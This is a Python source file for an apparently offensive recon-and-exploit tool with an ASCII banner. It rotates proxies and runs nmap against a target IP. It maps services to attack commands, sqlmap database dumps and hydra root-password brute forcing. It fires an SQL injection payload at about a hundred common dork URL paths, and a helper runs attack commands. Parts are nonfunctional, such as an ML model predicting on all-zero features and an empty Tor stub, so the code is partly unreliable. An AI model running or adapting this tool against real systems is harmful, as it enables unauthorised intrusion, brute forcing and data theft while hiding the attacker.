import pandas as pd
import subprocess
import json
import xml.etree.ElementTree as ET
import os
import re
import ipaddress
import logging
from colorama import init, Fore, Style
from datetime import datetime
from sklearn.model_selection import train_test_split
from sklearn.ensemble import RandomForestClassifier
from sklearn.metrics import accuracy_score
import requests
import random

logging.basicConfig(filename='scanner.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')


def validate_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False


def validate_ports(ports):
    valid_ports = []
    for port in ports:
        try:
            p = int(port)
            if 0 < p < 65536:
                valid_ports.append(p)
        except ValueError:
            continue
    return valid_ports


def train_model():
    data = pd.read_csv('data.csv')
    X = data.drop('target', axis=1)
    y = data['target']

    X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)

    model = RandomForestClassifier()
    model.fit(X_train, y_train)

    y_pred = model.predict(X_test)
    accuracy = accuracy_score(y_test, y_pred)
    logging.info(f'Model trained with accuracy: {accuracy:.2f}')
    print(f"ML model accuracy: {accuracy:.2f}")

    return model, list(X.columns)


init(autoreset=True)
banner = f"""
{Fore.RED}

 ██ ▄█▀ ██▓▓██   ██▓ ▄▄▄         ▓█████  ███▄    █  ▄▄▄██▀▀▀ ██▓ ██▓        ██▓███   ▒█████   █     █░▓█████  ██▀███  
 ██▄█▒ ▓██▒ ▒██  ██▒▒████▄       ▓█   ▀  ██ ▀█   █    ▒██   ▓██▒▓██▒       ▓██░  ██▒▒██▒  ██▒▓█░ █ ░█░▓█   ▀ ▓██ ▒ ██▒
▓███▄░ ▒██▒  ▒██ ██░▒██  ▀█▄     ▒███   ▓██  ▀█ ██▒   ░██   ▒██▒▒██░       ▓██░ ██▓▒▒██░  ██▒▒█░ █ ░█ ▒███   ▓██ ░▄█ ▒
▓██ █▄ ░██░  ░ ▐██▓░░██▄▄▄▄██    ▒▓█  ▄ ▓██▒  ▐▌██▒▓██▄██▓  ░██░▒██░       ▒██▄█▓▒ ▒▒██   ██░░█░ █ ░█ ▒▓█  ▄ ▒██▀▀█▄  
▒██▒ █▄░██░  ░ ██▒▓░ ▓█   ▓██▒   ░▒████▒▒██░   ▓██░ ▓███▒   ░██░░██████▒   ▒██▒ ░  ░░ ████▓▒░░░██▒██▓ ░▒████▒░██▓ ▒██▒
▒ ▒▒ ▓▒░▓     ██▒▒▒  ▒▒   ▓▒█░   ░░ ▒░ ░░ ▒░   ▒ ▒  ▒▓▒▒░   ░▓  ░ ▒░▓  ░   ▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▓░▒ ▒  ░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░▒ ▒░ ▒ ░ ▓██ ░▒░   ▒   ▒▒ ░    ░ ░  ░░ ░░   ░ ▒░ ▒ ░▒░    ▒ ░░ ░ ▒  ░   ░▒ ░       ░ ▒ ▒░   ▒ ░ ░   ░ ░  ░  ░▒ ░ ▒░
░ ░░ ░  ▒ ░ ▒ ▒ ░░    ░   ▒         ░      ░   ░ ░  ░ ░ ░    ▒ ░  ░ ░      ░░       ░ ░ ░ ▒    ░   ░     ░     ░░   ░ 
░  ░    ░   ░ ░           ░  ░      ░  ░         ░  ░   ░    ░      ░  ░                ░ ░      ░       ░  ░   ░     
            ░ ░                                                                                                       


{Style.RESET_ALL}
"""



def load_proxies(filename='proxies.txt'):
    with open(filename, 'r') as f:
        return [line.strip() for line in f if line.strip()]

PROXY_LIST = load_proxies()

def get_new_proxy():
    return random.choice(PROXY_LIST)

def get_proxy_session():
    session = requests.Session()
    proxy = get_new_proxy()
    print(f"Using proxy {proxy}")

    session.proxies = {
        "http" : proxy,
        "https" : proxy
    }

    return session

def main():
    with get_proxy_session() as sess:
        response = sess.get('https://api.ipify.org')
        print('Current IP with Proxy:', response.text)

def predict_vulnerabilities(model, features):
    pred = model.predict(pd.DataFrame([features]))
    return pred[0]


def scan_with_nmap(target_ip, options=None, timeout=60):
    if not validate_ip(target_ip):
        logging.error(f"Invalid IP address: {target_ip}")
        raise ValueError("Invalid IP address")

    logging.info(f"Starting nmap scan on {target_ip}")
    cmd = ['nmap', '-sV', '-T4', '-oX', '-']
    if options:
        cmd.extend(options)
    cmd.append(target_ip)

    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout, check=True)
        xml_output = result.stdout.decode()
        root = ET.fromstring(xml_output)

        scan_data = []
        for host in root.findall('host'):
            for port in host.findall('./ports/port'):
                port_id = int(port.get('portid'))
                protocol = port.get('protocol')
                state = port.find('state').get('state')
                service = port.find('service').get('name') if port.find('service') is not None else 'unknown'

                scan_data.append({
                    'port': port_id,
                    'protocol': protocol,
                    'state': state,
                    'service': service
                })

        logging.info(f"Scan finished on {target_ip} with {len(scan_data)} ports found.")
        return scan_data

    except subprocess.TimeoutExpired:
        logging.warning(f"Nmap scan timed out on {target_ip}")
        return None
    except subprocess.CalledProcessError as e:
        logging.error(f"Nmap scan failed: {e}")
        return None
    except ET.ParseError:
        logging.error("Failed to parse nmap XML output.")
        return None


def fetch_cves(service_name):
    url = f"https://services.nvd.nist.gov/rest/json/cves/1.0?keyword={service_name}"
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            cves = [item['cve']['CVE_data_meta']['ID'] for item in data.get('result', {}).get('CVE_Items', [])]
            return cves[:5]  # return top 5 CVEs
    except Exception as e:
        logging.error(f"Failed to fetch CVEs for {service_name}: {e}")
    return []


VULNERABILITY_DB = {
    "http": {
        "vulnerability": "SQL Injection",
        "tool": "sqlmap",
        "exploit_command": "sqlmap -u http://{ip}/ --batch --dbs"
    },
    "ssh": {
        "vulnerability": "Weak password / brute force",
        "tool": "hydra",
        "exploit_command": "hydra -l root -P passwords.txt ssh://{ip}"
    },
}


def suggest_attacks(ip, services):
    suggestions = []

    for service in services:
        s = service.lower()
        if s in VULNERABILITY_DB:
            cves = fetch_cves(s)
            vuln = VULNERABILITY_DB[s]
            suggestions.append({
                "service": s,
                "vulnerability": vuln["vulnerability"],
                "cve": cves,
                "tool": vuln["tool"],
                "exploit_command": vuln["exploit_command"].format(ip=ip)
            })
        else:
            suggestions.append({
                "service": s,
                "vulnerability": "Unknown or no common exploits found",
                "cve": [],
                "tool": None,
                "exploit_command": None
            })

    return json.dumps(suggestions, indent=4)


def run_exploit(command_list, timeout=120):
    if not isinstance(command_list, list):
        logging.error("Exploit command should be a list of command parts.")
        raise ValueError("Command must be list of args")

    logging.info(f"Running exploit: {' '.join(command_list)}")
    try:
        result = subprocess.run(command_list, capture_output=True, text=True, timeout=timeout)
        logging.info(f"Exploit finished with return code {result.returncode}")
        return {
            "command": command_list,
            "success": result.returncode == 0,
            "output": result.stdout.strip(),
            "error": result.stderr.strip()
        }
    except subprocess.TimeoutExpired:
        logging.warning(f"Exploit timed out: {' '.join(command_list)}")
        return {
            "command": command_list,
            "success": False,
            "output": "",
            "error": "TimeoutExpired"
        }


def generate_report(ip, attacks, results, directory="reports"):
    os.makedirs(directory, exist_ok=True)

    safe_ip = re.sub(r'[^a-zA-Z0-9\-_.]', '_', ip)
    filename = os.path.join(directory, f"report_{safe_ip}.json")

    report = {
        "date": datetime.now().isoformat(),
        "target": ip,
        "attacks": attacks,
        "results": results
    }

    try:
        with open(filename, "w") as f:
            json.dump(report, f, indent=4)
        logging.info(f"Report saved to {filename}")
    except IOError as e:
        logging.error(f"Failed to save report: {e}")


def get_tor_session():
    pass


def test_sqli_on_paths(ip, paths, timeout=5):
    sqli_payload = "' OR '1'='1"
    vulnerable_urls = []
    session = get_tor_session()

    for path in paths:
        if '=' not in path:
            logging.info(f"Skipping path without parameters: {path}")
            continue

        url = f"http://{ip}/{path}{sqli_payload}"
        try:
            response = requests.get(url, timeout=timeout)
            content = response.text.lower()

            error_signs = ["sql syntax", "mysql", "syntax error", "sqlstate", "database error",
                           "you have an error in your sql syntax"]

            if any(err in content for err in error_signs):
                logging.info(f"Possible SQL Injection vulnerability found: {url}")
                vulnerable_urls.append(url)

        except requests.RequestException as e:
            logging.warning(f"Request failed for {url}: {e}")

    return vulnerable_urls


if __name__ == "__main__":
    try:
        print(banner)

        model, feature_columns = train_model()

        target_ip = input("Enter target IP: ").strip()
        if not validate_ip(target_ip):
            print("Invalid IP address!")
            exit(1)

        ports_input = input("Enter open ports (comma-separated): ")
        ports = [p.strip() for p in ports_input.split(",")]
        open_ports = validate_ports(ports)
        if not open_ports:
            print("No valid ports entered!")
            exit(1)

        service_input = input("Enter service names (comma-separated): ")
        service_info = [s.strip() for s in service_input.split(",") if s.strip()]

        if service_info:
            sample_features = {col: 0 for col in feature_columns}
            pred = predict_vulnerabilities(model, sample_features)
            print(f"Predicted vulnerability class: {pred}")

        sqli_test_paths = [
            "view_items.php?id=",
            "home.php?cat=",
            "item_book.php?CAT=",
            "www/index.php?page=",
            "schule/termine.php?view=",
            "goods_detail.php?data=",
            "storemanager/contents/item.php?page_code=",
            "customer/board.htm?mode=",
            "help/com_view.html?code=",
            "n_replyboard.php?typeboard=",
            "eng_board/view.php?T****=",
            "prev_results.php?prodID=",
            "bbs/view.php?no=",
            "gnu/?doc=",
            "zb/view.php?uid=",
            "global/product/product.php?gubun=",
            "m_view.php?ps_db=",
            "productlist.php?tid=",
            "product-list.php?id=",
            "onlinesales/product.php?product_id=",
            "garden_equipment/Fruit-Cage/product.php?pr=",
            "product.php?shopprodid=",
            "product_info.php?products_id=",
            "showsub.php?id=",
            "product.php?sku=",
            "store/product.php?productid=",
            "productList.php?cat=",
            "product_detail.php?product_id=",
            "more_details.php?id=",
            "county-facts/diary/vcsgen.php?id=",
            "idlechat/message.php?id=",
            "podcast/item.php?pid=",
            "details.php?prodId=",
            "ourblog.php?categoryid=",
            "mall/more.php?ProdID=",
            "archive/get.php?message_id=",
            "review/review_form.php?item_id=",
            "english/publicproducts.php?groupid=",
            "news_and_notices.php?news_id=",
            "rounds-detail.php?id=",
            "gig.php?id=",
            "board/view.php?no=",
            "index.php?modus=",
            "news_item.php?id=",
            "rss.php?cat=",
            "products/product.php?id=",
            "details.php?ProdID=",
            "els_/product/product.php?id=",
            "store/description.php?iddesc=",
            "socsci/news_items/full_story.php?id=",
            "naboard/memo.php?bd=",
            "bookmark/mybook/bookmark.php?bookPageNo=",
            "board/board.html?table=",
            "kboard/kboard.php?board=",
            "order.asp?lotid=",
            "goboard/front/board_view.php?code=",
            "bbs/bbsView.php?id=",
            "boardView.php?bbs=",
            "eng/rgboard/view.php?&bbs_id=",
            "product/product.php?cate=",
            "content.php?p=",
            "page.php?module=",
            "?pid=",
            "bookpage.php?id=",
            "cbmer/congres/page.php?LAN=",
            "content.php?id=",
            "news.php?ID=",
            "photogallery.php?id=",
            "index.php?id=",
            "product/product.php?product_no=",
            "nyheder.htm?show=",
            "book.php?ID=",
            "print.php?id=",
            "detail.php?id=",
            "book.php?id=",
            "content.php?PID=",
            "more_detail.php?id=",
            "content.php?id=",
            "view_items.php?id=",
            "view_author.php?id=",
            "main.php?id=",
            "english/fonction/print.php?id=",
            "magazines/adult_magazine_single_page.php?magid=",
            "product_details.php?prodid=",
            "magazines/adult_magazine_full_year.php?magid=",
            "products/card.php?prodID=",
            "catalog/product.php?cat_id=",
            "e_board/modifyform.html?code=",
            "community/calendar-event-fr.php?id=",
            "products.php?p=",
            "news.php?id=",
            "StoreRedirect.php?ID=",
            "subcategories.php?id=",
            "tek9.php?",
            "template.php?Action=Item&pid=",
            "topic.php?ID=",
            "tuangou.php?bookid=",
            "type.php?iType=",
            "updatebasket.php?bookid=",
            "updates.php?ID=",
            "view.php?cid=",
            "view_cart.php?title=",
            "view_detail.php?ID=",
            "viewcart.php?CartId=",
            "viewCart.php?userID="
        ]

        print("Testing SQL Injection on common paths...")
        vulnerable_urls = test_sqli_on_paths(target_ip, sqli_test_paths)

        if vulnerable_urls:
            print(f"Possible SQL Injection vulnerabilities found at:")
            for url in vulnerable_urls:
                print(url)
        else:
            print("No SQL Injection vulnerabilities detected on tested paths.")

        if service_info:
            sample_features = {col: 0 for col in feature_columns}
            pred = predict_vulnerabilities(model, sample_features)
            print(f"Predicted vulnerability class: {pred}")

        suggestions_json = suggest_attacks(target_ip, service_info)
        print(suggestions_json)

    except Exception as e:
        logging.error(f"Fatal error: {e}")
        print(f"Error occurred: {e}")

